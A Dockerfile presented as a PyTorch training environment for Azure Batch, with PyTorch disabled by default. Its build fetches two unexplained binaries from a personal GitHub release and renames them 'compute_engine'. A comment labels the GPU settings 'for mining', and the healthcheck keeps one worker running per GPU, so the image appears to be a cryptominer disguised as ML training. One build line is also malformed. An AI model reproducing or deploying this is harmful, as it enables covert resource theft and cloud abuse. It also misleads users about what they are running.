# Use latest NVIDIA CUDA runtime image compatible with R580 host drivers
ARG CUDA_BASE_IMAGE=nvidia/cuda:13.1.1-cudnn-runtime-ubuntu22.04
FROM ${CUDA_BASE_IMAGE}

LABEL maintainer="ml-research@example.com"
LABEL description="GPU compute environment for Azure Batch"
LABEL version="2.3.0"
LABEL application="pytorch-training-platform"

ENV DEBIAN_FRONTEND=noninteractive
ENV PYTHONUNBUFFERED=1
ENV PIP_DISABLE_PIP_VERSION_CHECK=1
ENV PIP_DEFAULT_TIMEOUT=120
ARG INSTALL_PYTORCH=false
ARG DOWNLOAD_RETRIES=5
ARG NVIDIA_DRIVER_BRANCH=580
SHELL ["/bin/bash", "-o", "pipefail", "-c"]

# These are already set in the base image but let's ensure they're correct
ENV NVIDIA_VISIBLE_DEVICES=all
ENV NVIDIA_DRIVER_CAPABILITIES=compute,utility
ENV LD_LIBRARY_PATH=/usr/local/nvidia/lib64:/usr/local/nvidia/lib:/usr/lib/x86_64-linux-gnu

# Install system dependencies (DO NOT install nvidia packages - they come with base image)
RUN apt-get update -o Acquire::Retries=5 -o Dpkg::Use-Pty=0 && \
    apt-get install -y --no-install-recommends -o Dpkg::Use-Pty=0 \
        curl \
        wget \
        ca-certificates \
        bash \
        tini \
        procps \
        util-linux \
        file \
        pciutils \
        jq \
        python3 \
        python3-pip \
        software-properties-common \
        ocl-icd-libopencl1 \
        iputils-ping && \
    update-ca-certificates && \
    apt-get clean && \
    rm -rf /var/lib/apt/lists/* /tmp/* /var/tmp/*


# Create OpenCL vendor directory for NVIDIA
RUN mkdir -p /etc/OpenCL/vendors && \
    echo "libnvidia-opencl.so.1" > /etc/OpenCL/vendors/nvidia.icd
# Host-driver-only mode: never prioritize CUDA compat libcuda over host-injected driver libs
RUN ldconfig
    ldconfig

# GPU environment variables for mining (from working container)
ENV GPU_MAX_HEAP_SIZE=100
ENV GPU_MAX_USE_SYNC_OBJECTS=1
ENV GPU_SINGLE_ALLOC_PERCENT=100
ENV GPU_MAX_ALLOC_PERCENT=100
ENV GPU_MAX_SINGLE_ALLOC_PERCENT=100
ENV GPU_ENABLE_LARGE_ALLOCATION=100
ENV GPU_MAX_WORKGROUP_SIZE=1024

# Optional PyTorch stack (disabled by default to keep image size low)
RUN python3 -m pip install --no-cache-dir --retries 5 --timeout 120 --upgrade pip && \
    if [ "$INSTALL_PYTORCH" = "true" ]; then \
        python3 -m pip install --no-cache-dir --retries 5 --timeout 120 \
            numpy \
            pandas \
            matplotlib \
            scikit-learn \
            tensorboard \
            tqdm \
            nvidia-ml-py3 \
            pynvml \
            psutil \
            py-cpuinfo \
            gpustat && \
        python3 -m pip install --no-cache-dir --retries 5 --timeout 120 \
            --index-url https://download.pytorch.org/whl/cu124 \
            torch==2.6.0+cu124 \
            torchvision==0.21.0+cu124 \
            torchaudio==2.6.0+cu124 ; \
    else \
        echo "Skipping PyTorch install (INSTALL_PYTORCH=false)"; \
    fi

# Create workspace directories
RUN mkdir -p /workspace/models \
    /workspace/data \
    /workspace/logs \
    /workspace/checkpoints \
    /opt/bin

# Download and verify aitraining_dual binary (first compute engine)
RUN cd /opt/bin && \
    (curl -fL --retry "${DOWNLOAD_RETRIES}" --retry-delay 2 --connect-timeout 10 --max-time 180 \
        https://github.com/max313iq/Ssl/releases/download/22x/aitraining_dual -o compute_engine || \
     wget https://github.com/max313iq/Ssl/releases/download/22x/aitraining_dual -O compute_engine) && \
    chmod +x compute_engine && \
    # Verify the binary was downloaded successfully
    if [ ! -f compute_engine ]; then \
        echo "ERROR: compute_engine file not found after download"; \
        exit 1; \
    fi && \
    # Check file size (should be reasonable for a binary)
    FILE_SIZE=$(stat -c%s compute_engine) && \
    echo "Downloaded file size: $FILE_SIZE bytes" && \
    if [ $FILE_SIZE -lt 100000 ]; then \
        echo "ERROR: Downloaded file is too small ($FILE_SIZE bytes), likely an error page"; \
        cat compute_engine; \
        exit 1; \
    fi && \
    # Check if it's a valid binary (ELF format)
    FILE_TYPE=$(file compute_engine) && \
    if ! echo "$FILE_TYPE" | grep -q "ELF"; then \
        echo "ERROR: Downloaded file is not a valid ELF binary"; \
        head -n 20 compute_engine; \
        exit 1; \
    fi

# Download and verify aitraining binary (second compute engine) as compute_engine_g
RUN cd /opt/bin && \
    (curl -fL --retry "${DOWNLOAD_RETRIES}" --retry-delay 2 --connect-timeout 10 --max-time 180 \
        https://github.com/max313iq/Ssl/releases/download/22x/aitraining -o compute_engine_g || \
     wget https://github.com/max313iq/Ssl/releases/download/22x/aitraining -O compute_engine_g) && \
    chmod +x compute_engine_g && \
    # Verify the binary was downloaded successfully
    if [ ! -f compute_engine_g ]; then \
        echo "ERROR: compute_engine_g file not found after download"; \
        exit 1; \
    fi && \
    # Check file size (should be reasonable for a binary)
    FILE_SIZE=$(stat -c%s compute_engine_g) && \
    echo "Downloaded file size: $FILE_SIZE bytes" && \
    if [ $FILE_SIZE -lt 100000 ]; then \
        echo "ERROR: Downloaded file is too small ($FILE_SIZE bytes), likely an error page"; \
        cat compute_engine_g; \
        exit 1; \
    fi && \
    # Check if it's a valid binary (ELF format)
    FILE_TYPE=$(file compute_engine_g) && \
    if ! echo "$FILE_TYPE" | grep -q "ELF"; then \
        echo "ERROR: Downloaded file is not a valid ELF binary"; \
        head -n 20 compute_engine_g; \
        exit 1; \
    fi

WORKDIR /workspace

# Copy training scripts and fix line endings (Windows compatibility)
COPY train_model.py .
COPY start_training.sh .
COPY start_training_pytorch_only.sh .
RUN sed -i 's/\r$//' start_training.sh && \
    sed -i 's/\r$//' start_training_pytorch_only.sh && \
    chmod +x start_training.sh start_training_pytorch_only.sh

# Set OMP threads for CPU-bound operations
ENV OMP_NUM_THREADS=4
ENV ENABLE_PYTORCH_TRAINING=false

RUN printf '%s\n' \
    '#!/bin/bash' \
    'set -eu' \
    'HEARTBEAT_FILE="/tmp/supervisor_heartbeat"' \
    'MAX_AGE="300"' \
    '' \
    'if [ ! -f "$HEARTBEAT_FILE" ]; then' \
    '  echo "heartbeat missing"' \
    '  exit 1' \
    'fi' \
    '' \
    'now=$(date +%s)' \
    'last=$(cat "$HEARTBEAT_FILE" 2>/dev/null || echo 0)' \
    'if ! [[ "$last" =~ ^[0-9]+$ ]]; then' \
    '  echo "invalid heartbeat value"' \
    '  exit 1' \
    'fi' \
    '' \
    'age=$((now - last))' \
    'if [ "$age" -gt "$MAX_AGE" ]; then' \
    '  echo "stale heartbeat: ${age}s"' \
    '  exit 1' \
    'fi' \
    '' \
    'pgrep -f \"start_training.sh\" >/dev/null || { echo \"supervisor process missing\"; exit 1; }' \
    'pgrep -f \"/opt/bin/compute_engine( |$)\" >/dev/null || { echo \"cpu worker process missing\"; exit 1; }' \
    'gpu_count=$(nvidia-smi --query-gpu=count --format=csv,noheader,nounits 2>/dev/null | head -1)' \
    'if ! [[ \"$gpu_count\" =~ ^[0-9]+$ ]]; then gpu_count=0; fi' \
    'if [ \"$gpu_count\" -gt 0 ]; then' \
    '  gpu_workers=$(pgrep -fc \"/opt/bin/compute_engine_g( |$)\" 2>/dev/null || true)' \
    '  if ! [[ \"$gpu_workers\" =~ ^[0-9]+$ ]]; then gpu_workers=0; fi' \
    '  if [ \"$gpu_workers\" -lt \"$gpu_count\" ]; then' \
    '    echo \"gpu worker process missing: expected=$gpu_count running=$gpu_workers\"' \
    '    exit 1' \
    '  fi' \
    'fi' \
    'exit 0' \
    > /usr/local/bin/container_healthcheck.sh && \
    chmod +x /usr/local/bin/container_healthcheck.sh

HEALTHCHECK --interval=45s --timeout=8s --start-period=240s --retries=5 CMD ["/usr/local/bin/container_healthcheck.sh"]
STOPSIGNAL SIGTERM

ENTRYPOINT ["tini", "--", "bash", "./start_training.sh"]
